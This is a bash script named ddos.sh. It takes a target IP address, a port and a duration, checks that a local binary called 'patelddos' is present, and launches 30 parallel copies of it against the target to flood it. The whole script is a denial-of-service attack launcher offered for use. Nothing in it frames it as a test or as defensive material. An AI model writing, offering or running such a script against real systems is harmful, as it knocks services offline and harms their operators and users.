#!/bin/bash

X=30

TARGET_IP=$1
PORT=$2
TIME=$3

if [[ -z "$TARGET_IP" || -z "$PORT" || -z "$TIME" ]]; then
    echo "Usage: ./ddos.sh <target_ip> <port> <time>"
    exit 1
fi

if [ ! -f "./patelddos" ]; then
    echo "[!] patelddos binary not found."
    exit 1
fi
echo "[+] patelddos found."

echo "[*] Running $X parallel patelddos -> $TARGET_IP:$PORT for ${TIME}s..."
for ((i=1; i<=X; i++)); do
    ./patelddos $TARGET_IP $PORT $TIME &
    pids[$i]=$!
done

for pid in ${pids[*]}; do
    wait $pid
done

echo "[+] Done."
